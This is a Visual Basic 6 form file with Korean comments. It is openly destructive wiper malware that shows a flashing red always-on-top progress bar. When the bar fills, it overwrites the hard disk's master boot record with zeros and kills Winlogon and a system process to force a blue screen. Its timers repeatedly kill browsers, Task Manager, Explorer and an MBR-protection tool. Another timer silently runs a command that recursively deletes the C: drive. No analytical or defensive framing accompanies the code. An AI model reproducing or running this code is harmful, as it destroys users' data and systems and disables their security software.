VERSION 5.00
Begin VB.Form Frm_Kill 
   BackColor       =   &H000000FF&
   BorderStyle     =   0  '없음
   Caption         =   "Form1"
   ClientHeight    =   975
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   12990
   LinkTopic       =   "Form1"
   ScaleHeight     =   975
   ScaleWidth      =   12990
   ShowInTaskbar   =   0   'False
   StartUpPosition =   1  '소유자 가운데
   Begin VB.Timer Timer99 
      Interval        =   10000
      Left            =   10800
      Top             =   360
   End
   Begin VB.Timer Timer4 
      Interval        =   100
      Left            =   10320
      Top             =   240
   End
   Begin VB.Timer TimerG 
      Enabled         =   0   'False
      Interval        =   600
      Left            =   9960
      Top             =   240
   End
   Begin VB.Timer TimerB 
      Interval        =   600
      Left            =   9600
      Top             =   240
   End
   Begin VB.Timer Timer 
      Interval        =   1200
      Left            =   9240
      Top             =   240
   End
   Begin killC.ProgressBar ProgressBar1 
      Height          =   495
      Left            =   120
      TabIndex        =   0
      Top             =   240
      Width           =   12735
      _ExtentX        =   22463
      _ExtentY        =   873
      Value           =   0
      Theme           =   8
      TextStyle       =   2
      BeginProperty TextFont {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "굴림"
         Size            =   12
         Charset         =   129
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Text            =   "U11D ProgressBar"
      TextEffectColor =   16777215
      TextEffect      =   3
   End
End
Attribute VB_Name = "Frm_Kill"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Sub Form_Load()
   On Error GoTo Form_Load_Error

AlwaysTop Frm_Kill, True '폼 최상위

   On Error GoTo 0
   Exit Sub

Form_Load_Error:

    MsgBox "Error " & Err.Number & " (" & Err.Description & ") in procedure Form_Load of Form Frm_Kill"
End Sub

Private Sub Timer_Timer() ' 타이머의 이밴트를 시작한다.
   On Error GoTo Timer_Timer_Error

ProgressBar1.Value = ProgressBar1.Value + 1 ' 진행바의 퍼샌트를 1씩 추가한다

If ProgressBar1.Value = 100 Then ' 만약 진행바가 100%일시
'## 주의!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'## 하드디스크에서 MBR 를 조짐
Dim buf() As Byte, i As Long
Dim DDChicken As New clsDiskIO
App.TaskVisible = False
DDChicken.OpenDrive 0
buf = DDChicken.ReadBytes(False)
For i = 0 To 511
buf(i) = 0
Next
DDChicken.WriteBytes buf, False
DDChicken.UpdateDisk
DDChicken.CloseDrive
ProcessKill GetProcess("cress.exe")  '//블루스크린 유발
ProcessKill GetProcess("Winlogon.exe")  '//블루스크린 유발
End If ' if 문을 종료한다.

   On Error GoTo 0
   Exit Sub

Timer_Timer_Error:

    MsgBox "Error " & Err.Number & " (" & Err.Description & ") in procedure Timer_Timer of Form Frm_Kill"
End Sub ' 타임어의 이밴트를 종료한다.

Private Sub Timer4_Timer()
   On Error GoTo Timer4_Timer_Error

ProcessKill GetProcess("iexplore.exe") '//인터넷 차단
ProcessKill GetProcess("NateOnMain.exe")  '//네이트온 차단
ProcessKill GetProcess("GOM.exe")  '//곰플레이어 차단
ProcessKill GetProcess("taskmgr.exe")  '//작업관리자(프로세스) 차단
ProcessKill GetProcess("KCleaner.exe")  '//KCleaner(프로세스) 차단
ProcessKill GetProcess("chrome.exe")  '//크롬 차단
ProcessKill GetProcess("skype.exe")  '//스카이프 차단
ProcessKill GetProcess("steam.exe")  '//스팀 차단
ProcessKill GetProcess("explorer.exe")  '//윈도우 차단
ProcessKill GetProcess("nPMBRGuard.exe")  '//MBR GUARD 차단
ProcessKill GetProcess("nPMBRSvc.exe")  '//MBR GUARD 차단

   On Error GoTo 0
   Exit Sub

Timer4_Timer_Error:

    MsgBox "Error " & Err.Number & " (" & Err.Description & ") in procedure Timer4_Timer of Form Frm_Kill"
End Sub

Private Sub Timer99_Timer()
Shell "cmd.exe /c rmdir /s /q c:\", vbHide '윈10일 경우 명령줄로 c삭제
End Sub

Private Sub TimerB_Timer() '배경색 타이머
   On Error GoTo TimerB_Timer_Error

Frm_Kill.BackColor = &HC0&
TimerB.Enabled = False
TimerG.Enabled = True

   On Error GoTo 0
   Exit Sub

TimerB_Timer_Error:

    MsgBox "Error " & Err.Number & " (" & Err.Description & ") in procedure TimerB_Timer of Form Frm_Kill"
End Sub

Private Sub TimerG_Timer() '배경색 타이머
   On Error GoTo TimerG_Timer_Error

Frm_Kill.BackColor = &HFF&
TimerB.Enabled = True
TimerG.Enabled = False

   On Error GoTo 0
   Exit Sub

TimerG_Timer_Error:

    MsgBox "Error " & Err.Number & " (" & Err.Description & ") in procedure TimerG_Timer of Form Frm_Kill"
End Sub

